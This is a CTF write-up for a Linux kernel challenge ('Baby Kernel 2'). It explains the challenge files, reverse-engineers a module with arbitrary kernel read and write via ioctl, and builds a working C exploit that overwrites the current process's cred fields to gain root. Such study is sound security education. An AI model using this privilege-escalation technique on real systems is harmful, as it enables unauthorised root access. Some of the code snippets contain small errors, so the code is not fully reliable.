# Baby Kernel 2 (kernel, +smep, +smap, -kaslr)

## Understanding what we are given
In this challenge we are given standard linux kernel CTF challenge setup:

```console
$ unzip baby_kernel_2_7787916f9b06d129da1aae2dc2b5f42a.zip 
Archive:  baby_kernel_2_7787916f9b06d129da1aae2dc2b5f42a.zip
   creating: public/
  inflating: public/initramfs.cpio.gz  
  inflating: public/vmlinux          
  inflating: public/System.map       
  inflating: public/bzImage          
  inflating: public/run.sh

$ ls public/
bzImage  initramfs.cpio.gz  run.sh  System.map  vmlinux
```

As this is my first kernel challenge, I will briefly describe what are all of those files for. Nnote: as this is my first challenge I might be completely wrong. I will also put some exclamation marks, but this is not because I'm so experienced, but because there is so much new stuff that I have to priorotize it.

Let's start with `bzImage` and `vmlinux`:

```console
$ file bzImage
public/bzImage: Linux kernel x86 boot executable bzImage, version 4.19.77 (sceptic@sceptic-arch) #2 PREEMPT Fri Oct 11 00:50:19 CEST 2019, RO-rootFS, swap_dev 0x1, Normal VGA

$ file vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e611a1f0d4d255ef9bc2dfa4deca5b0fbaec1749, with debug_info, not stripped
```

As most linux programs the operating system itself is also an ELF executable. The vmlinux file is this one huge executable.

As linux kernel nowdays has 20+ milions lines of code it takes a lot of space where the space available to store the compressed kernel code is limited. This is why bzImage has been introduces. It uses smart tricks to split kernel over discontiguous memory regions.

We can confirm the size difference of the files using ls with -lh flag

```console
$ ls -lh 
-rw-r--r-- 1 k k 1,9M paź 21 22:41 bzImage
-rw-r--r-- 1 k k 68M paź 21 22:41 vmlinux
```

Ok, but if `bzImage` is just smarter way of storing operating system than `vmlinux` then why are we given both files?
Well, the challenge itself uses only `bzImage`, but the `vmlinux` was provided to help us with the challenge. It can help out with debuging, searching for gadgets and looking for symbols. We will use it later on.

Note: you can extract the vmlinux yourself using `extract-vmlinux` script. You can read how to do this [here](https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/)

If we are speaking about files which are left only for us, then this is right place to introduce System.map. It is just a symbol to address mapping. By symbols I mean functions and global variables:

```console
$ cat System.map | head -10
0000000001000000 A phys_startup_64
ffffffff030f5000 A init_per_cpu__gdt_page
ffffffff03122000 A init_per_cpu__irq_stack_union
ffffffff81000000 T _stext
ffffffff81000000 T _text
ffffffff81000000 T startup_64
ffffffff81000030 T secondary_startup_64
ffffffff810000e0 T verify_cpu
ffffffff810001e0 T __startup_64
ffffffff810003b0 T __startup_secondary_64
```

Note: System.map can be found inside /boot/System.map-$(uname -r).


Then we have `initramfs.cpio.gz`. It contains packed filesystem. We will find there often `flag` file and source or at least binaries of vulnerable `modules`.

Let's check what's inside of provided initramfs.cpio.gz by extracting it:

```console
$ mkdir extracted
$ cd extracted
$ zcat ../initramfs.cpio.gz | cpio -idmv
.
bin
bin/busybox
client_kernel_baby_2
etc
etc/group
etc/inittab
etc/passwd
etc/shadow
flag
home
home/user
init
lib
lib/modules
lib/modules/4.19.77
lib/modules/4.19.77/kernel_baby_2.ko
proc
root
sys
usr
usr/bin
usr/sbin
usr/share
var
7393 blocks
k@c:~/tmp/public/extracted$ ls
bin  client_kernel_baby_2  etc  flag  home  init  lib  proc  root  sys  usr  var
```

See? A proper filesystem! Except of well known folders like /etc, /home we can directly spot `flag`, `init`, `lib/modules/4.19.77/kernel_baby_2.ko` and `client_kernel_baby_2` binaries. We will speak about them in a bit. For now just note that you should alwJustays look inside `initramfs.cpio.gz`!

Let's move to `run.sh` script:

```bash
DIR="$(dirname "$(readlink -f "$0")")"
qemu-system-x86_64 -monitor /dev/null \
    -cpu max,+smap,+smep,check \
    -m 64 -nographic \
    -kernel "$DIR/bzImage" \
    -initrd "$DIR/initramfs.cpio.gz" \
    -append "console=ttyS0 init='/init'"
```

all it does it runs the linux vm.

It also specifies some general options like:
- `-nographic` which will run the vm without GUI
- `-m 64` which limits virtual ram to 64 megabytes
- `-monitor /dev/null` which redirects the monitor to /dev/null as we don't want to interact with qemu options outside of run.sh

Besides that we can find already known:
- `-kernel "$DIR/bzImage"` which tells the qemu to use bzImage as kernel image
- `"$DIR/initramfs.cpio.gz"` which tells the qemu to use initramfs.cpio.gz as source for filesystem

Finally we have:
- `-append "console=ttyS0 init='/init'"`
option which tells qemu to open console and run `init` file.

I bet this is a lot for you (it was for me), and so for now you should only be looking for keywords such as: smep, smap, kaslr. This are the software and hardware protections and so our attack technique will depend on whether they are enabled or disabled.
Here we have smep and smap enabled and kaslr is disabled. I will explain them later on when we reach exploit phase.

We are left with last, `init` script which we found in extracted `initramfs.cpio.gz`. I really don't want to overhelm you so I will only focus on most important parts.

```
#!/bin/busybox sh
# /bin/sysinfo

/bin/busybox --install /bin
/bin/mkdir /sbin
/bin/busybox --install /sbin

export PATH="/bin;$PATH"
export LD_LIBRARY_PATH="/lib"

mkdir -p /dev /sys /proc /tmp

mount -t devtmpfs none /dev
mount -t sysfs sys /sys
mount -t proc proc /proc
mount -t tmpfs none /tmp

# chown
chown -R 0:0  /bin /etc /home /init /lib /root /tmp /var
chown -R 1000:1000 /home/user
chown 0:0 / /dev /proc /sys
chown 0:0 /flag

# chmod
chmod -R 700 /etc /home /root /var
chmod -R 755 /bin /init /lib
chmod -R 1777 /tmp
chmod 755 /
chmod 755 /etc
chmod 744 /etc/passwd /etc/group
chmod 755 /home
chmod 700 /etc/shadow

chmod 700 /flag

mkdir -p /lib/modules/$(uname -r)

insmod "/lib/modules/$(uname -r)/kernel_baby_2.ko"
chmod +rw /dev/flux_baby_2
chmod +x /client_kernel_baby_2

sleep 2

su user -c /client_kernel_baby_2

# /bin/sh

poweroff -f -n -d 0
```

This script is run just after linux boots. It runs with root privilages. It creates two users (a root user: root and a normal unprivilage user: user), then sets permissions (chmod, chown) to files (ex. so that only root can read /flag).

### Modules
Then there is perhaps a new instruction for you called insmod:

```bash
insmod "/lib/modules/$(uname -r)/kernel_baby_2.ko"
chmod +rw /dev/flux_baby_2
chmod +x /client_kernel_baby_2
```

Before I explain above instructions this is a right place to understand how (at least not advanced) kernel exploitation challenges are build. It might be confusing that we are exploiting a linux kernel but does it means that someone want's us to find a 0day? NO. Most challenges focus on exploiting modules. Linux supports adding your own chunk of code that can use kernel functions and globals but doesn't require kernel recompilation or reboot. The modules run inside kernel and so pose a great attack target for hackers.

A simple hello world module can look like:

```c
// hello.c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
	printk(KERN_INFO "Hello world\n");
	return 0;
}

void cleanup_module(void) {
	printk(KERN_INFO "Goodbye world\n");
}

module_init(init_module);
module_exit(cleanup_module);
```

all it has to have is a constructor `init_module` and destructor `cleanup_module`. Then you specify which function is a constructor and which is a destructor with filling `module_init` and `module_exit` macros.

You compile module with simple Kbuild:

```makefile
# Makefile
obj-m += hello.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
``` 

using make command and load it using `insmod` command. To remove it you use `rmmod` command.

```console
# make
...
# insmod hello.ko
# dmesg
Hello world
# rmmod hello.ko
# dmesg
Hello world
Goodbye world
```

How can you communicate with module from code? Well, they usually come with char devices. They are placed inside /dev folder.

## Challenge itself
In this challenge we found 3 files inside initramfs.cpio.gz:
- lib/modules/4.19.77/kernel_baby_2.ko: kernel module binary. This file perhaps contains the vulnerability and in the end we will have to exploit it. It runs inside kernel so when exploited we can gain privilages escalation :)
- /dev/flux_baby_2: a char device used to communicate with the module. Standard functions to communicate with it are: `open`, `close`, `read`, `write`, `llseek`, `ioctl`.
- client_kernel_baby_2: in this specific challenge we cannot communicate with a char device as a user (chown 0:0 /dev in init file). But we can run ./client_kernel_baby_2 program which just wraps the `open`, `close`, ..., `ioctl` functions and invokes them on `/dev/flux_baby_2`. This means that our exploit will just communicate with this binary.

So we have two files to reverse engineer: `client_kernel_baby_2` and `kernel_baby_2.ko`. 

When running `./run.sh` the `client_kernel_baby_2` program will be run in the console right after kernel boots. 

```console
$ ./run.sh 
Linux version 4.19.77 (sceptic@sceptic-arch) (gcc version 9.2.0 (GCC)) #2 PREEMPT Fri Oct 11 00:50:19 CEST 2019
Command line: console=ttyS0 init='/init'
x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[...]
clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x19f2010fc46, max_idle_ns: 440795276803 ns
clocksource: Switched to clocksource tsc
flux_baby_2 opened
----- Menu -----
1. Read
2. Write
3. Show me my uid
4. Read file
5. Any hintz?
6. Bye!
> 
```

This is because of the `su user -c /client_kernel_baby_2` placed at the end of `init` file. As I prefer to have more control I started with commenting this line and uncommenting shell: /bin/bash.

```console
$ cat init | tail -8

sleep 2

# su user -c /client_kernel_baby_2

/bin/sh

poweroff -f -n -d 0
```

Now we have to pack our updated initramfs.cpio.gz. We can do this by using this command:

```console
$ cd extracted

$ find . -print0 | cpio --null -ov --format=newc | gzip -9 >../initramfs.cpio.gz
.
./initramfs.cpio.gz
./extracted
[...]
./bzImage
./System.map
./run.sh
155123 blocks
```

And let's run ./run.sh again:

```console
$ ./run.sh
Linux version 4.19.77 (sceptic@sceptic-arch) (gcc version 9.2.0 (GCC)) #2 PREEMPT Fri Oct 11 00:50:19 CEST 2019
Command line: console=ttyS0 init='/init'
[...]
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
```

Oh, we are root as well! Well yes, bacause init script runs with root privilages. Of course this won't be possible on challenge server where we cannot modify `./run.sh` file. But it is a good idea to modify init localy and log in as root as we gain access to useful debugging stuff like: dmesg, /proc/kallsyms, etc.

## Changing lab setting
As at the time of writing there is no working netcat server I will write an exploit in c which will directly exploit the kernel module without touching the `client_kernel_baby_2`. This won't spoil the task, but simulate real privilage escalation from user to root account. Of course we need to change the setup for this. Just change permissions of /dev/flux_baby_2 inside init file, so that user can execute it.

Now let's open `kernel_baby_2` in Ghidra. There is no main functio n this time. To understand how we can communicate with the char device we must look at `file_operations` structure. Each char device has assosiated `file_operations` structure.

```c
struct file_operations {
  [...]
  loff_t (*llseek) (struct file *, loff_t, int);
  ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
  ssize_t (*write) (struct file *, const char __user *, size_t,
      loff_t *);
  int (*unlocked_ioctl) (struct file *, unsigned int,
      unsigned long);
  int (*compat_ioctl) (struct file *, unsigned int,
      unsigned long);
  int (*open) (struct inode *, struct file *);
  int (*release) (struct inode *, struct file *);
  [...]
};
```

One can treat it as polimirphism in c. The function pointed as `open` must handle `open` operation that user has called on a file descriptor related to this char device. It usually just allocated some structures needed for later operation. `release` handles `close` (this is more complicated, as in fact it handles situation when references drop to 0) and usually just cleans all allocated structures.
Then we have `read`, `write`, `llseek`. Not every char device must implement them all. `read` for example should handle functions such as `read`, `pread`, `readv` invoked by user on this char device.
Finally we have: `unlocked_ioctl` and `compat_ioctl`. Often they point to same function. The only difference is that `compat_ioctl` should be 32 bit compatibile.

In `kernel_baby_2` we have:

```c
struct file_operations flux_operation {
  [...]
  .open             = driver_open,
  .release          = driver_close,
  .compat_ioctl     = driver_ioctl,
  .unlocked_ioctl   = driver_ioctl,
  [...]
```

So let's check what they do. 

```c
int driver_open(struct inode ind*, struct file flip*) {
  printk("flux_baby_2 opened\n");
  return 0;
}

int driver_close(struct inode ind*, struct file flip*) {
  printk("flux_baby_2 closed\n");
  return 0;
}
```

So open and release just print debug informations nothing more:) Let's  check `driver_ioctl` function:


```c
// simplified! Created write function as it was inlined.
#define READ_CMD 0x385
#define WRITE_CMD 0x386

struct read_arg_t {
  void* from;
  void* to;
};

struct write_arg_t {
  void* ptr;
  void* val;
};


long driver_ioctl(struct file *flip_1, ulong cmd, ulong arg) {
  printk("flux_baby_2 ioctl nr %d called\n", cmd);

  switch (cmd) {
    case READ_CMD:
      read((struct read_arg_t*) arg);
      break;

    case WRITE_CMD:
      write((struct write_arg_t*) arg);
      break;
  }

  return 0;
}
```

So ioctl is a big switch depending on a provided cmd parameter. The arg argument is usually a pointer to argument structure. In case of READ_CMD it is a `struct read_arg_t *` and in case of WRITE_CMD is is a `struct write_arg_t *`.

Let's first check `read` function. If you follow this task and you use Ghidra then change the function signature as Ghidra will think this is a standard `ssize_t read(int fd, char* buf, size_t count)` function.

```c
void read(struct read_arg_t *read_arg) {
  struct read_arg_t read_arg_kernel;
  unsigned long val;
  
  _copy_from_user(&read_arg_kernel, read_arg, sizeof(struct read_arg_kernel)); // [0]

  val = *(unsigned long) read_arg_kernel.from; // [1]

  _copy_to_user(read_arg_kernel.to, &val, sizeof(val)); // [2]
}
```

copy_from_user and copy_to_user are standard kernel functions. When you are writing kernel code you must not access user data directly at it could lead to serious security issues. So in [0] kernel just copies the user argument to his own local variable `read_arg_kernel`. Then in [1] kernel reads a value under address a user specified and finaly in [2] he copies this value back to userspace.

Hmm, but this means that we can read values at any address we want! Not only from user but also from kernel space! This is for sure a big security issue which we will take advantage of!

Let's implement a general function for reading an address by using ioctl function of /dev/flux_baby char device:

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

struct read_arg_t {
    char* from;
    char* to;
};

int fd;

int driver_read(void* to, void* from) {
    int err;
    struct read_arg_t read_arg;
    
    read_arg.from = from;
    read_arg.to = to;

    err = ioctl(fd, COPY_REQUEST, &read_arg);
    if (err < 0) {
        perror("[-] ioctl COPY_REQUEST\n");
        goto fail;
    }
    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);

    return 0;
fail:
    return -1;
}


int main() {
    int err;

    fd = open("/dev/flux_baby_2", O_RDWR, 0);
    if (fd < 0) {
        perror("[-] open /dev/flux_baby_2\n");
        goto fail;
    }
    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);

    close(fd);
    return 0;

fail:
    return -1;
}
```

Reading address of our choice gives as a lot of power, but won't be enough. This means that we need to find something more. Let's check second command implementation which is `write`:

```c
void write(struct write_arg_t *write_arg) {
  struct write_arg_t write_arg_kernel;

  _copy_from_user(&write_arg, write_arg, sizeof(struct write_arg_t));
  *(unsigned long) write_arg_kernel.ptr = write_arg_kernel.val;
}
```

So `dwirte` just writes user provided value to user provided address. This is amazing. We just got arbitrary write in kernel space. Before we find a way to use it, let's add write to our exploit:

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

struct read_arg_t {
    char* from;
    char* to;
};

struct write_arg_t {
    char *ptr;
    unsigned long val;
};

int fd;

int driver_read(void* to, void* from) {
    int err;
    struct read_arg_t read_arg;
    
    read_arg.from = from;
    read_arg.to = to;

    err = ioctl(fd, COPY_REQUEST, &read_arg);
    if (err < 0) {
        perror("[-] ioctl COPY_REQUEST\n");
        goto fail;
    }
    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);

    return 0;
fail:
    return -1;
}

int driver_write(void *ptr, unsigned long val) {
    int err;
    struct write_arg_t write_arg;

    write_arg.ptr = ptr;
    write_arg.val = val;

    err = ioctl(fd, WRITE_REQUEST, &write_arg);
    if (err < 0) {
        perror("[-] ioctl WRITE_REQUEST\n");
        goto fail;
    }
    printf("[+] Set value under address: %p to val: %lu\n", ptr, val);

    return 0;
fail:
    return -1;
}

int main() {
    int err;

    fd = open("/dev/flux_baby_2", O_RDWR, 0);
    if (fd < 0) {
        perror("[-] open /dev/flux_baby_2\n");
        goto fail;
    }
    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);

    close(fd);
    return 0;

fail:
    return -1;
}
```

Now the question is. What can we do having arbitrary read and write? We still do not control $rip, but do we have to? No. As you can read in [here](https://github.com/kscieslinski/CTF/tree/master/notes/permissions#kernel-structures--capabilities) kernel allocated struct task_struct for each process. This structure keeps most relevant informations about a process. One of the informations is a pointer to `cred` structure. In the `cred` structure we have fields such as: `uid`, `guid`, `suid`, `sgid` etc. We all know that root has all those fields set to 0, and our unprivilaged user has them set to 1000. So what we can actually do is to set them to 0. (this should be enough to read a flag, but some actions might still be not allowed for us, because kernel uses mostly capabilities and not ids to check if some action should be permited). All we need to get is an address of those fields!

You can imagine that kernel developers quite often need to access informations about a current process. And so there is a very helpful global variable:

`struct task_struct *current_task;`

which points to a task_struct of a current process. As there is no KASLR enabled and we are provided System.map we can find an address of it:

```console
$ egrep "current_task" System.map
ffffffff8183a040 D current_task
```

Cool! But this is just an address of a pointer. What we need is an address of a structure. But we can use our arbitrary read vulnerability to read it. Let's start writing our escalate function:

```c
/* Escalate process privilages by overwriting current_task->cred->uid */
int escalate() {
    int err;
    u_int64_t current;

    err = driver_read(&current, CURRENT_TASK_ADDR);
    if (err < 0) {
        perror("[-] leak address of current\n");
        goto fail;
    }
    printf("[+] Leaked address of current: %p\n", current);

    return 0;
fail:
    return -1;
}

int main() {
    [...]
    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);

    err = escalate();
    if (err < 0) {
        perror("[-] Failed to escalate privilages\n");
        goto fail;
    }

    close(fd);
    [...]
}
```

## Upload exploit
We can now test it out. But I havn't mentioned how to upload exploit on a target machine. I've spent a lot of time trying to setup scp or a shared folder between host and guest which does not make any sense. The linux vms provided in task are really light and so they don't have gcc nor network card. I prefer to compile exploit localy (staticaly!) and then place it in initramfs.cpio.gz. Of course you cannot do this on a challenge server. If you need to transport final exploit to challenge server you can compile it localy and then base64 encode it,  copy paste it and finaly base64 decode it.

```console
$ cd exported
$ gcc exploit.c -o exploit --static
$ find . -print0 | cpio --null -ov --format=newc | gzip -9 >../initramfs.cpio.gz
[...]
$ ./run.sh
[...]
$ ./exploit
flux_baby_2 opened
[+] Opened device /dev/flux_baby_2, fd assigned: 3
flux_baby_2 ioctl nr 901 called
[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7fffc87ee300
[+] Leaked address of current: 0xffff888000114600
flux_baby_2 closed
```

## gdb
0xffff888000114600 is a valid kernel address as kernel space range is [0xffff880000000000-0xffffffffffffffff] and so it seems that we successfully leaked current process task_struct address. Now we have to find offset of cred field as again we would like to get a structure address.

Now it is a right time to use gdb! We will want to breakpoint on read instruction, so we need to determinate the address. We cannot use System.map this time as it doesn't contain modules symbols. But this is good as we will learn more techniques! Just load module (init does it for us) and check it's address in /proc/kallsyms:

```console
# cat /proc/kallsyms  | grep baby
ffffffffa0001024 r _note_6	[kernel_baby_2]
ffffffffa0002388 b devt	[kernel_baby_2]
ffffffffa0002380 b cdev	[kernel_baby_2]
ffffffffa0002000 d fops	[kernel_baby_2]
ffffffffa0002380 b __key.35767	[kernel_baby_2]
ffffffffa0002100 d __this_module	[kernel_baby_2]
ffffffffa000007c t driver_close	[kernel_baby_2]
ffffffffa0000090 t driver_read	[kernel_baby_2]
ffffffffa0000040 t write	[kernel_baby_2]
ffffffffa0000000 t read	[kernel_baby_2] // <-- break here
ffffffffa00000d2 t driver_ioctl	[kernel_baby_2]
ffffffffa0000068 t driver_open	[kernel_baby_2]
```

First you need to add `-s -S` options to `run.sh` script:

```bash
#!/bin/sh

DIR="$(dirname "$(readlink -f "$0")")"
qemu-system-x86_64 -monitor /dev/null \
    -cpu max,+smap,+smep,check \
    -m 64 -nographic \
    -kernel "$DIR/bzImage" \
    -initrd "$DIR/initramfs.cpio.gz" \
    -append "console=ttyS0 init='/init'" \
    -s -S
```

The `-s` option will tell qemu to open gdbserver on port 1234, while `-S` will tell qemu not to start before we will attach to it.

In first console tab run update `run.sh`:

```c
$ ./run.sh
```

And in second tab run gdb. Run it on vmlinux to load all symbols! See, it is quite useful! Then we connect to our vm with `target remote :1234` command. And now we can set breakpoints. Note that before linux boots you can use only hardware breakpoints as it hasn't yet loaded exception handling needed for software ones. 

```gdb
$ gdb vmlinux
gef➤  target remote :1234
gef➤  hb  *0xffffffffa0000000
gef➤  c
Continuing.

```

Now we have to run our exploit in first tab.

```console
$ ./exploit
flux_baby_2 opened
[+] Opened device /dev/flux_baby_2, fd assigned: 3
flux_baby_2 ioctl nr 901 called
```

And back to tab with gdb where we should have hit a breakpoint. Examine the address of current_task, current_task.cred and continue to double check that we found a correct address of current_task.

```console
Breakpoint 1, 0xffffffffa0000000 in ?? ()
gef➤  p &current_task
$1 = (struct task_struct **) 0xffffffff8183a040 <current_task>
gef➤  p current_task
$2 = (struct task_struct *) 0xffff888002c41180
gef➤  p &current_task.cred
$3 = (const struct cred *) 0xffff888002c41580
gef➤  c
```

In first tab we should see this output:

```console
/ $ ./exploit
flux_baby_2 opened
[+] Opened device /dev/flux_baby_2, fd assigned: 3
flux_baby_2 ioctl nr 901 called
[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7ffdf70768b0
[+] Leaked address of current: 0xffff888002c41180
```

See, the address of current is as we expected! Now let's check the offset of cred pointer:

0xffff888002c41580 - 0xffff888002c41180 = 0x400

and update our escalate function to leak it:

```c
#define COPY_REQUEST 0x385
#define WRITE_REQUEST 0x386

#define CURRENT_TASK_ADDR ((void*) 0xffffffff8183a040)

#define EFF_CRED_TASK_STRUCT_OFST 0x400

int escalate() {
    int err;
    u_int64_t current;
    u_int64_t current_creds;

    err = driver_read(&current, CURRENT_TASK_ADDR);
    if (err < 0) {
        perror("[-] leak address of current\n");
        goto fail;
    }
    printf("[+] Leaked address of current: %p\n", current);

    err = driver_read(&current_creds, current + EFF_CRED_TASK_STRUCT_OFST);
    if (err < 0) {
        perror("[-] current creds addr\n");
        goto fail;
    }
    printf("[+] Leaked current_creds address: %p\n", current_creds);
}
```

You can now run it. The output should be:

```console
flux_baby_2 opened
[+] Opened device /dev/flux_baby_2, fd assigned: 3
flux_baby_2 ioctl nr 901 called
[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7ffdf70768b0
[+] Leaked address of current: 0xffff888002c41180
flux_baby_2 ioctl nr 901 called
[+] Copied 8 bytes from: 0xffff888002c41578, to: 0x7ffdf70768b8
[+] Leaked current_creds address: 0xffff888002c5d180
```

Ok, so we have exact address of current_creds. Now let's use arbitrary write to overwrite creds. We will overwrite `uid`, `gid`, `suid`, ..., `fsgid` of struct cred.

```c
struct cred {
  atomic_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
  [...]
};
```

Our update exploit. I've added system("id") call to observe the escalation. Of course run this script as a user.

```c
#define COPY_REQUEST 0x385
#define WRITE_REQUEST 0x386

#define CURRENT_TASK_ADDR ((void*) 0xffffffff8183a040)

#define EFF_CRED_TASK_STRUCT_OFST 0x400
#define UID_CRED_OFST 0x4
#define FSGID_CRED_OFST 0x20

/* Escalate process privilages by overwriting current_task->cred->uid */
int escalate() {
    int err;
    u_int64_t current;
    u_int64_t current_creds;

    err = driver_read(&current, CURRENT_TASK_ADDR);
    if (err < 0) {
        perror("[-] leak address of current\n");
        goto fail;
    }
    printf("[+] Leaked address of current: %p\n", current);

    err = driver_read(&current_creds, current + EFF_CRED_TASK_STRUCT_OFST);
    if (err < 0) {
        perror("[-] current creds addr\n");
        goto fail;
    }
    printf("[+] Leaked current_creds address: %p\n", current_creds);

    printf("[i] Before overwriting current->cred structure our process id is user:\n");
    system("id;");
    for (size_t ofst = UID_CRED_OFST; ofst <= FSGID_CRED_OFST; ofst += 0x8) {
        err = driver_write(current_creds + ofst, 0);
        if (err < 0) {
            perror("[-] Failed to overwrite creds\n");
            goto fail;
        }
    }
    printf("[i] After overwriting current->cred structure our process id shoud be root:\n");
    system("id; cat /flag");

    return 0;
fail:
    return -1;
}
```

The output:

```console
flux_baby_2 opened
[+] Opened device /dev/flux_baby_2, fd assigned: 3
flux_baby_2 ioctl nr 901 called
[+] Copied 8 bytes from: 0xffffffff8183a040, to: 0x7ffdf70768b0
[+] Leaked address of current: 0xffff888002c41180
flux_baby_2 ioctl nr 901 called
[+] Copied 8 bytes from: 0xffff888002c41578, to: 0x7ffdf70768b8
[+] Leaked current_creds address: 0xffff888002c5d180
[i] Before overwriting current->cred structure our process id is user:
uid=1000(user) gid=1000(user) groups=1000(user)
flux_baby_2 ioctl nr 902 called
[+] Set value under address: 0xffff888002c5d184 to val: 0
flux_baby_2 ioctl nr 902 called
[+] Set value under address: 0xffff888002c5d18c to val: 0
flux_baby_2 ioctl nr 902 called
[+] Set value under address: 0xffff888002c5d194 to val: 0
flux_baby_2 ioctl nr 902 called
[+] Set value under address: 0xffff888002c5d19c to val: 0
[i] After overwriting current->cred structure our process id shoud be root:
uid=0(root) gid=0(root) groups=1000(user)
flag{fake_flag}
flux_baby_2 closed
```


## References
- https://www.tldp.org/LDP/lkmpg/2.6/html/x181.html
- https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
- http://eternal.red/2019/sloppy-dev-writeup/